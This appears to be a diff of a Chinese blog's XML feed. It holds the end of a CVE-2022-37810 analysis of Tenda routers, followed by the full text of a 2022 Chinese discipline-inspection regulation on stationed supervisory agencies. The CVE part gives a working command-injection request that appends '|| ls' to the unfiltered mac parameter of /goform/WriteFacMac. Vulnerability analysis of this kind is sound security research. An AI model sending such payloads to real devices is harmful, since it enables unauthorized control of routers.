+<pre class="line-numbers language-none"><code class="language-none">main -&gt; initWebs -&gt; formDefineTenDa -&gt; websFormDefine('WriteFacMac',formWriteFacMac);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>formDefineTenDa包含路由器接口和对应的处理函数，通过websFormDefine注册后，WriteFacMac会和formWriteFacMac形成绑定，在goform下产生接口WriteFacMac调用formWriteFacMac</p>
+<p>192.168.130.137/goform/WriteFacMac</p>
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121174942212.png"></p>
+<h4 id="initWebs"><a href="#initWebs" class="headerlink" title="initWebs"></a>initWebs</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121170833769.png"></p>
+<h4 id="formDefineTenDa"><a href="#formDefineTenDa" class="headerlink" title="formDefineTenDa"></a>formDefineTenDa</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121165748345.png"></p>
+<h4 id="websGetVar"><a href="#websGetVar" class="headerlink" title="websGetVar"></a>websGetVar</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121172710514.png"></p>
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121172721758.png"></p>
+<p>判断wp中的mac参数是否存在，不存在返回默认值00:01:02:11:22:33，存在则返回对应值，没有做任何过滤，因此可以直接构造。</p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>当wp判断mac参数是否存在时，返回值没有做任何过滤，因此可以直接构造。</p>
+<pre class="line-numbers language-none"><code class="language-none">192.168.130.137/goform/WriteFacMac?mac=00:01:02:11:22:33 || ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121175540394.png"></p>
 ]]></content>
       <categories>
-        <category>工具书</category>
+        <category>CVE</category>
       </categories>
       <tags>
-        <tag>实体法规</tag>
+        <tag>CVE</tag>
       </tags>
   </entry>
   <entry>
@@ -2911,6 +2760,157 @@ CLEANUP:
       </categories>
       <tags>
         <tag>综合法规</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>纪检监察机关派驻机构工作规则（2022年6月22日）</title>
+    <url>/2024/10/20/%E7%BA%AA%E6%A3%80%E7%9B%91%E5%AF%9F%E6%9C%BA%E5%85%B3%E6%B4%BE%E9%A9%BB%E6%9C%BA%E6%9E%84%E5%B7%A5%E4%BD%9C%E8%A7%84%E5%88%99%EF%BC%882022%E5%B9%B46%E6%9C%8822%E6%97%A5%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h2><p>  <strong>第一条</strong> 为了加强和规范纪检监察机关派驻机构工作，根据《中国共产党纪律检查委员会工作条例》和《中华人民共和国监察法》，制定本规则。</p>
+<p>  <strong>第二条</strong> 派驻机构工作坚持以习近平新时代中国特色社会主义思想为指导，增强“四个意识”、坚定“四个自信”、做到“两个维护”，坚持自我革命，坚持敢于斗争，坚持实事求是，深入贯彻全面从严治党战略方针，坚定不移推进党风廉政建设和反腐败斗争，建立健全系统集成、协同高效的派驻监督体制机制，增强“派”的权威和“驻”的优势，一体推进不敢腐、不能腐、不想腐，充分发挥监督保障执行、促进完善发展作用。</p>
+<p>  <strong>第三条</strong> 在党中央集中统一领导下，中央纪律检查委员会国家监察委员会向中央一级党和国家机关以及其他组织派驻纪检监察机构，地方各级纪律检查委员会监察委员会向本级党和国家机关以及其他组织派驻纪检监察机构。派驻机构是派出机关的组成部分，与驻在单位是监督和被监督的关系。</p>
+<p>  派驻机构应当强化政治监督，把坚持和加强党的领导贯穿工作全过程各方面，推动驻在单位切实做到“两个维护”，贯彻党的理论和路线方针政策，落实党中央决策部署。</p>
+<p>  <strong>第四条</strong> 派驻机构遵循以下原则开展工作：</p>
+<p>  （一）坚持党中央集中统一领导，强化组织自上而下的监督功能；</p>
+<p>  （二）坚持民主集中制，重要事项集体研究决定；</p>
+<p>  （三）坚持敢于善于监督，完善常态化监督工作机制；</p>
+<p>  （四）坚持职责定位，依规依纪依法履行职责；</p>
+<p>  （五）坚持各项监督统筹衔接，推动全面从严治党主体责任和监督责任一体落实；</p>
+<p>  （六）坚持监督与被监督相统一，自觉接受各方面监督。</p>
+<p>第五条 派驻机构应当持续深化转职能、转方式、转作风，聚焦全面从严治党、党风廉政建设和反腐败工作，强化监督职责，突出工作重点，创新履职方式，有效运用“四种形态”，增强派驻监督全覆盖的有效性，推动派驻监督工作高质量发展。</p>
+<h2 id="第二章-组织设置"><a href="#第二章-组织设置" class="headerlink" title="第二章 组织设置"></a>第二章 组织设置</h2><p>  <strong>第六条</strong> 中央纪律检查委员会国家监察委员会向中央一级党和国家机关、中管金融企业派驻纪检监察组。地方各级纪律检查委员会监察委员会向本级党和国家机关、所管辖的国有金融企业派驻纪检监察组。</p>
+<p>  中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会按照规定向国有企业、普通高等学校等单位派驻纪检监察组；或者依法派驻监察机构，派驻监察专员并设立监察专员办公室，与该单位党的纪律检查机构合署办公。</p>
+<p>  对系统规模大、直属单位多、监督对象多的单位，可以单独派驻纪检监察组；对业务关联度高，或者需要统筹力量实施监督的相关单位，可以综合派驻纪检监察组。</p>
+<p>  <strong>第七条</strong> 派驻机构主要负责人按照规定担任驻在单位的党组（党委）成员，履行监督专责，不分管驻在单位工作。</p>
+<p>  派驻机构主要负责人实行交流任职、定期轮岗。</p>
+<p>  <strong>第八条</strong> 派驻机构的领导机构是组务会。组务会由派驻机构正职、副职组成。组务会会议学习贯彻落实党中央决策部署，贯彻中央纪委国家监委工作部署，落实派出机关工作安排，研究讨论管辖范围内纪检监察工作的重要问题、重要事项，按照权限讨论或者决定党纪政务处分等事项。</p>
+<p>  派驻机构应当健全组务会会议以及组长办公会议、专题会议等会议制度，完善议事决策机制。</p>
+<p>  <strong>第九条</strong> 派驻机构应当按照信访举报、监督检查、审查调查、案件监督管理、案件审理相互协调、相互制约的原则，结合实际设置内设机构或者明确人员分工。</p>
+<h2 id="第三章-领导体制"><a href="#第三章-领导体制" class="headerlink" title="第三章 领导体制"></a>第三章 领导体制</h2><p>  <strong>第十条</strong> 各级党委应当加强对纪检监察机关派驻机构工作的领导，健全机构设置、干部管理、工作保障等机制，听取纪律检查委员会监察委员会关于派驻监督工作的汇报，推动派驻机构履职尽责。</p>
+<p>  <strong>第十一条</strong> 驻在单位应当支持配合派驻机构工作，主动及时通报重要情况、重要问题，根据派驻机构工作需要提供有关材料，为派驻机构开展工作创造条件、提供保障。</p>
+<p>  <strong>第十二条</strong> 派驻机构由派出机关直接领导、统一管理，向派出机关负责，受派出机关监督。</p>
+<p>  各级纪律检查委员会常务委员会应当定期听取派驻监督工作情况报告。派出机关分管领导应当定期召开派驻机构负责人会议，经常同派驻机构主要负责人研究工作。</p>
+<p>  <strong>第十三条</strong> 派出机关相关部门根据职能职责，加强对派驻机构的指导、联系、服务和保障。</p>
+<p>  监督检查部门协助分管领导联系派驻机构日常工作：</p>
+<p>  （一）指导督促派驻机构履行职责；</p>
+<p>  （二）对派驻机构请示报告的问题、事项进行审核把关；</p>
+<p>  （三）对派出机关交办的重要案件、事项进行督促办理；</p>
+<p>  （四）办理派驻机构提请支持、协调的重要事项；</p>
+<p>  （五）向派驻机构通报驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员的一般性问题和谈话提醒、批评教育、责令检查、诫勉谈话等情况；</p>
+<p>  （六）联系开展其他工作。</p>
+<p>  <strong>第十四条</strong> 派出机关相关部门应当会同派驻机构联合开展以下监督工作：</p>
+<p>  （一）开展专项检查，推动驻在单位落实党中央决策部署；</p>
+<p>  （二）研判驻在单位政治生态，有针对性地开展监督；</p>
+<p>  （三）开展专题调查研究，查找分析利用公共权力和资源设租寻租、离职后违规从业等行业性、系统性廉洁风险，向驻在单位提出意见建议或者督促开展专项治理；</p>
+<p>  （四）支持配合派出机关同级党委巡视巡察机构开展工作，对整改情况进行监督；</p>
+<p>  （五）推动驻在单位落实纪检监察建议；</p>
+<p>  （六）其他需要联合开展的监督工作。</p>
+<p>  <strong>第十五条</strong> 派出机关监督检查部门、审查调查部门对于派驻机构管辖的重大、复杂案件，经批准可以直接办理或者组织、指挥办理。</p>
+<p>  <strong>第十六条</strong> 派出机关相关部门应当指导、协调派驻机构与地方纪律检查委员会监察委员会协作开展以下工作：</p>
+<p>  （一）协同开展专项检查、专项监督，推动解决有关系统和领域的突出问题；</p>
+<p>  （二）协作采取监督检查、审查调查措施；</p>
+<p>  （三）协商确定驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件的管辖，或者由派驻机构报请派出机关指定有关地方纪委监委管辖；</p>
+<p>  （四）联合审查调查驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件；</p>
+<p>  （五）其他需要协作开展的工作。</p>
+<p>  <strong>第十七条</strong> 派出机关相关部门应当组织、指导各派驻机构之间协作配合开展以下工作：</p>
+<p>  （一）针对共性或者关联性问题同步开展专项监督；</p>
+<p>  （二）对重大、复杂案件进行联合审查调查；</p>
+<p>  （三）协作开展案件审理、复议复查和复审工作；</p>
+<p>  （四）对派出机关部署的重要工作落实情况开展交叉检查或者联合检查；</p>
+<p>  （五）联合开展调研、培训；</p>
+<p>  （六）其他需要协作配合开展的工作。</p>
+<p>  <strong>第十八条</strong> 派驻机构应当加强对驻在单位内设纪检机构及直属单位纪检机构的业务指导和监督检查，督促、支持其发挥职能作用，推动纪检干部队伍建设，加强政治教育和业务培训，协调人员力量开展监督执纪工作。</p>
+<p>  <strong>第十九条</strong> 派驻垂直管理单位的纪检监察组应当加强对驻在单位的下一级单位纪检机构的业务指导和监督检查，对驻在单位各级纪检机构的工作进行统筹，推动层层落实监督责任。下一级单位纪检机构的监督执纪工作以派驻纪检监察组领导为主，线索处置和案件查办在向同级党组（党委）报告的同时应当一并向派驻纪检监察组报告。</p>
+<p>  实行双重领导并以上级单位领导为主的单位，国有企业、国有金融企业的派驻机构工作，参照前款规定执行。</p>
+<p>  <strong>第二十条</strong>各级纪律检查委员会监察委员会派出的机关纪检监察工作委员会，按照规定审理有关派驻机构审查调查的案件，定期向派出机关报告案件审理工作情况。在派出机关领导下，建立健全案件质量评查机制，向派驻机构反馈评查结果。</p>
+<p>  机关纪检监察工作委员会应当加强与派驻机构的沟通协调，对本级党和国家机关部门机关纪委的执纪审查工作进行协同指导。</p>
+<p>  <strong>第二十一条</strong> 派驻国有资产监管机构、教育行政部门等的纪检监察组，按照规定协助派出机关加强对国有企业、普通高等学校等单位派驻机构工作的指导，形成监督合力。</p>
+<p>  派驻国有资产监管机构的纪检监察组，应当加强对驻在单位党组（党委）管理领导班子的国有企业纪检机构监督执纪工作的领导。相关国有企业纪检机构的线索处置和案件查办在向同级党委报告的同时，应当一并向派驻纪检监察组报告。</p>
+<h2 id="第四章-工作职责"><a href="#第四章-工作职责" class="headerlink" title="第四章 工作职责"></a>第四章 工作职责</h2><p>  <strong>第二十二条</strong> 派驻机构依规依纪依法履行监督执纪问责和监督调查处置职责。</p>
+<p>  <strong>第二十三条</strong> 派驻机构应当把监督作为基本职责，结合驻在单位实际，重点监督检查以下情况：</p>
+<p>  （一）对党忠诚，践行党的性质宗旨情况；</p>
+<p>  （二）贯彻党的理论和路线方针政策、落实党中央决策部署、践行“两个维护”情况；</p>
+<p>  （三）落实全面从严治党主体责任、加强党风廉政建设和反腐败工作情况；</p>
+<p>  （四）贯彻执行民主集中制、依规依法履职用权、廉洁自律等情况。</p>
+<p>  <strong>第二十四条</strong> 派驻机构应当重点监督以下对象：</p>
+<p>  （一）驻在单位领导班子及其成员特别是主要负责人；</p>
+<p>  （二）驻在单位上级党委管理的其他人员；</p>
+<p>  （三）驻在单位党组（党委）管理的领导班子及其成员；</p>
+<p>  （四）其他列入重点监督对象的驻在单位人员。</p>
+<p>  <strong>第二十五条</strong> 派驻机构应当支持和督促驻在单位党组（党委）落实全面从严治党主体责任，协助其开展内部巡视巡察，推动驻在单位深化改革、健全制度、完善治理、防控风险。</p>
+<p>  <strong>第二十六条</strong> 派驻机构应当结合派驻监督工作情况，推动驻在单位党组（党委）开展全面从严治党、党风廉政建设和反腐败工作的形势任务教育，强化纪法教育、警示教育，推进廉洁文化建设，教育引导党员、干部以及监察对象修身律己，筑牢思想道德防线。</p>
+<p>  <strong>第二十七条</strong> 派驻机构对反映驻在单位党组织和党员、干部以及监察对象问题的检举控告，按照规定受理和处置。</p>
+<p>  <strong>第二十八条</strong> 派驻机构对驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员涉嫌违纪和职务违法、职务犯罪问题线索，经批准可以参与派出机关的初步核实、审查调查工作。</p>
+<p>  <strong>第二十九条</strong> 派驻机构负责审查以下党组织和党员涉嫌违犯党纪的案件：</p>
+<p>  （一）驻在单位党组（党委）直接领导的党组织；</p>
+<p>  （二）驻在单位党组（党委）管理的领导班子成员；</p>
+<p>  （三）本规则第二十四条第四项规定的人员。</p>
+<p>  派驻机构必要时可以审查驻在单位党组（党委）管理的其他党组织和党员涉嫌违犯党纪的案件。</p>
+<p>  派驻机构根据派出机关授权，依法调查驻在单位监察对象涉嫌职务违法、职务犯罪案件。</p>
+<p>  <strong>第三十条</strong> 派驻机构按照管理权限，对违纪违法的驻在单位党组织和党员、干部以及监察对象进行处理处分，对不履行或者不正确履行职责的驻在单位党组织和领导干部进行问责。</p>
+<p>  <strong>第三十一条</strong> 派驻机构负责受理和处置以下申诉或者复审申请：</p>
+<p>  （一）党组织和党员对派驻机构所作处理决定不服的申诉；</p>
+<p>  （二）监察对象对派驻机构所作处理决定不服的复审申请；</p>
+<p>  （三）被调查人及其近亲属对派驻机构及其工作人员侵害被调查人合法权益行为的申诉。</p>
+<p>  对于派驻机构立案审查调查后由驻在单位作出处理决定案件的申诉或者复核申请，派驻机构应当协助驻在单位做好有关处置工作。</p>
+<h2 id="第五章-履职程序"><a href="#第五章-履职程序" class="headerlink" title="第五章 履职程序"></a>第五章 履职程序</h2><p>  <strong>第三十二条</strong> 派驻机构开展日常监督应当深入实际、深入群众，监督方式包括：</p>
+<p>  （一）参加会议。参加或者列席驻在单位领导班子会议等重要会议，了解学习贯彻党中央决策部署以及上级党组织决定情况和班子成员的意见态度，“三重一大”决策制度执行情况，按照规定向派出机关报告。</p>
+<p>  （二）谈心谈话。同党员、干部和群众广泛谈心谈话，听取对监督对象的反映，发现监督对象存在苗头性、倾向性问题的，进行谈话提醒、批评教育。</p>
+<p>  （三）听取汇报。听取驻在单位党组（党委）管理的领导班子及其成员履行管党治党责任情况的汇报，发现责任落实不到位的，进行提醒纠正。</p>
+<p>  （四）查阅资料。按照规定查阅、复制驻在单位有关文件、资料、数据等材料，了解核实有关情况。</p>
+<p>  （五）沟通情况。加强与驻在单位机关党委、党委办公室和组织人事、巡视巡察、法规法务、财务审计等部门的沟通，及时发现和通报问题。</p>
+<p>  （六）分析研判。分析信访举报、党风廉政等情况，对典型性、普遍性问题向驻在单位提出意见建议。</p>
+<p>  （七）廉政把关。建立健全、动态更新驻在单位党组（党委）管理的领导干部廉政档案，严把党风廉政意见回复关。</p>
+<p>  （八）实地调查。开展驻点调研、现场核查，精准发现驻在单位存在的突出问题。</p>
+<p>  （九）其他开展日常监督的方式。</p>
+<p>  <strong>第三十三条</strong> 派驻机构应当严格执行报告制度，发现驻在单位领导班子及其成员重要问题、重要事项及时向派出机关报告。</p>
+<p>  派驻机构应当经常对驻在单位领导班子及其成员坚持党的领导、加强党的建设、履行全面从严治党主体责任情况以及党风廉政状况进行分析，每年向派出机关提交专题报告。</p>
+<p>  &nbsp;<strong>第三十四条</strong> 派驻机构应当定期会同驻在单位党组（党委）专题研究全面从严治党、党风廉政建设和反腐败工作。派出机关监督检查部门根据情况派员参加。</p>
+<p>  派驻机构主要负责人应当经常与驻在单位党组（党委）主要负责人就政治生态、作风建设、廉洁风险等情况交换意见，提出工作建议，督促完善有关制度措施。</p>
+<p>  <strong>第三十五条</strong> 派驻机构应当向驻在单位领导班子成员通报其分管部门和单位领导干部遵守党章党规党纪、廉洁自律等情况，推动领导班子成员落实“一岗双责”要求，抓好分管部门和单位的党风廉政建设工作。</p>
+<p>  <strong>第三十六条</strong> 派驻机构对驻在单位开展内部巡视巡察提供以下协助：</p>
+<p>  （一）通报监督执纪执法中发现的问题；</p>
+<p>  （二）处置内部巡视巡察移交的问题线索；</p>
+<p>  （三）检查整改责任落实情况；</p>
+<p>  （四）其他协助内部巡视巡察的工作。</p>
+<p>  <strong>第三十七条</strong> 派驻机构应当指定专人负责管理涉嫌违纪和职务违法、职务犯罪问题线索，逐件编号登记，建立管理台账。</p>
+<p>  派驻机构应当结合日常监督掌握的情况，对问题线索进行综合分析、适当了解，采取谈话函询、初步核实、暂存待查、予以了结等方式进行处置。线索处置意见应当自收到线索之日起1个月内提出。</p>
+<p>  处置问题线索应当报派驻机构主要负责人审批，并按照规定报派出机关备案。</p>
+<p>  <strong>第三十八条</strong> 派驻机构经过初步核实，需要进行立案审查调查的，应当报派驻机构主要负责人审批。其中，对驻在单位党组（党委）直接领导的党组织、党组（党委）管理的领导班子成员中的正职领导干部立案和副职领导干部涉嫌严重职务违法、职务犯罪立案的，应当报派出机关审批。</p>
+<p>  派驻机构在立案前应当征求驻在单位党组（党委）主要负责人意见，对于有不同意见的应当报派出机关决定。确因安全保密等特殊情况，经派出机关同意，也可以在立案后及时向驻在单位党组（党委）主要负责人通报。</p>
+<p>  <strong>第三十九条</strong> 派驻机构按照规定报批后，可以依规依纪依法采取谈话、讯问、询问、留置、查询、冻结、搜查、调取、查封、扣押（暂扣、封存）、勘验检查、鉴定措施。对依法应当交有关机关执行的措施，报派出机关审批并以派出机关名义办理。</p>
+<p>  派驻机构应当对审查调查措施进行严格监管，建立措施使用台账，定期将有关情况报派出机关案件监督管理部门、监督检查部门备案。</p>
+<p>  <strong>第四十条</strong> 派驻机构审查调查工作结束后，应当按照规定进行审理，提出纪律处理或者党纪处分建议、拟作出的政务处分决定或者处分建议，通报驻在单位党组（党委）。</p>
+<p>  <strong>第四十一条</strong> 驻在单位党组（党委）按照权限和程序，对违纪的党组织、党员作出纪律处理或者党纪处分决定。</p>
+<p>  派驻机构按照管理权限，对违法的监察对象依法作出政务处分决定；建议驻在单位处分的，由驻在单位依法依规作出处分决定。</p>
+<p>  派驻机构提出的处理处分建议与驻在单位党组（党委）的意见不同又不能协商一致的，由派驻机构报派出机关研究决定。</p>
+<p>  <strong>第四十二条</strong> 派驻机构发现驻在单位党组（党委）管理的党组织和领导干部失职失责造成严重后果或者恶劣影响，需要进行问责调查的，应当报派驻机构主要负责人审批后，启动问责调查程序。</p>
+<p>  派驻机构应当依规依纪依法开展问责调查，查明失职失责问题，按照管理权限作出问责决定，或者向有权作出问责决定的党组织（单位）提出问责建议。</p>
+<p>  对党组织采取改组方式问责的，按照党章和其他党内法规规定的权限、程序执行。对领导干部采取党纪政务处分方式问责的，按照本规则第三十八条、第四十条、第四十一条办理。</p>
+<p>  <strong>第四十三条</strong> 派驻机构对调查的监察对象和涉案人员涉嫌职务犯罪案件，经集体审议，认为犯罪事实清楚，证据确实、充分，需要追究刑事责任的，依法依规移送人民检察院审查起诉。</p>
+<p>  <strong>第四十四条</strong> 派驻机构发现驻在单位在贯彻党中央决策部署、落实全面从严治党主体责任、开展党风廉政建设以及决策机制、监督管理、制度执行等方面存在突出问题或者薄弱环节的，应当提出纪检监察建议。</p>
+<p>派驻机构应当加强对驻在单位问题整改情况的监督检查，督促限期整改、反馈，推动纪检监察建议落实到位。</p>
+<h2 id="第六章-管理监督"><a href="#第六章-管理监督" class="headerlink" title="第六章 管理监督"></a>第六章 管理监督</h2><p>  <strong>第四十五条</strong> 派驻机构必须坚持以习近平新时代中国特色社会主义思想武装头脑、指导实践、推动工作，以党的政治建设为统领推进党的各方面建设，教育引导派驻机构干部忠于职守、履职尽责，不断提高政治判断力、政治领悟力、政治执行力，带头增强“四个意识”、坚定“四个自信”、做到“两个维护”，发扬党的优良传统和作风，加强思想淬炼、政治历练、实践锻炼、专业训练，增强法治意识、程序意识、证据意识，建设政治素质高、忠诚干净担当、专业化能力强、敢于善于斗争的派驻机构干部队伍。</p>
+<p>  派驻机构党组织应当严格执行党的组织生活制度，推进党支部标准化规范化建设，增强党组织政治功能和组织力凝聚力，发挥战斗堡垒作用。</p>
+<p>  <strong>第四十六条</strong> 派出机关应当严把派驻机构干部入口关，按照干部管理权限统筹派出机关和派驻机构干部的选拔任用、人员交流、考核培训、监督管理，有计划地安排派驻机构干部参与派出机关工作、进行培养锻炼。</p>
+<p>  <strong>第四十七条</strong> 派出机关应当每年组织派驻机构主要负责人进行述责述廉。结合驻在单位特点，对派驻机构履行职责以及自身建设等方面情况进行考核。考核中，应当听取驻在单位领导班子和有关方面的意见，并将其作为考核的重要依据。</p>
+<p>  <strong>第四十八条</strong> 派驻机构应当加强规范化、法治化、正规化建设，明确职权范围，健全内控机制，规范工作流程和审批权限，完善回避、保密和过问、干预案件登记备案等管理制度，建立健全办案安全责任制，推动各项工作依规依纪依法进行。</p>
+<p>  <strong>第四十九条</strong> 派驻机构应当坚持打铁必须自身硬，坚持严的标准，勇于刀刃向内，牢固树立监督者更要自觉接受监督的意识，加强自我管理、自我约束，不断提高免疫力，切实防治“灯下黑”。</p>
+<p>  派驻机构应当接受派出机关同级党委巡视巡察监督和派出机关的管理监督，对所提监督意见进行整改落实，并报告整改情况。</p>
+<p>  派驻机构应当明确专门机构或者人员负责干部日常管理监督工作，及时汇总各方面意见，对自身权力运行的关键环节进行经常性检查，认真核查相关检举控告，按照规定将处置情况向派出机关干部监督部门报告。</p>
+<p>  派驻机构应当听取驻在单位领导班子对派驻机构工作的意见建议，认真研究处理，并及时反馈。自觉接受驻在单位党员、干部和群众的监督，畅通意见反映渠道，对反映的问题进行调查核实处置，不断完善制度、改进工作。</p>
+<p>  <strong>第五十条</strong> 派驻机构干部有跑风漏气、迟报瞒报、滥用职权、以案谋私以及其他违规违纪违法行为的，依规依纪依法严肃处理；构成犯罪的，依法追究刑事责任。</p>
+<p>  <strong>第五十一条</strong> 派驻机构及其领导干部不履行或者不正确履行职责，导致应当发现的问题没有发现，或者发现问题不报告不处置，执纪执法不严格不规范，造成严重后果或者恶劣影响的，予以严肃问责。</p>
+<h2 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h2><p>  <strong>第五十二条</strong> 本规则涉及的审批权限均指最低审批权限，工作中根据需要可以按照更高层级的审批权限报批。</p>
+<p>  <strong>第五十三条</strong> 派驻国有企业、普通高等学校的监察机构、监察专员（监察专员办公室）除执行本规则外，还应当执行中央纪律检查委员会国家监察委员会相关规定。</p>
+<p>  <strong>第五十四条</strong> 中央军事委员会可以根据本规则制定相关细则。</p>
+<p>  <strong>第五十五条</strong> 本规则由中央纪律检查委员会国家监察委员会负责解释。</p>
+<p>  <strong>第五十六条</strong> 本规则自发布之日起施行。此前发布的其他有关纪检监察机关派驻机构工作的规定，凡与本规则不一致的，按照本规则执行。</p>
+]]></content>
+      <categories>
+        <category>工具书</category>
+      </categories>
+      <tags>
+        <tag>实体法规</tag>
       </tags>
   </entry>
   <entry>
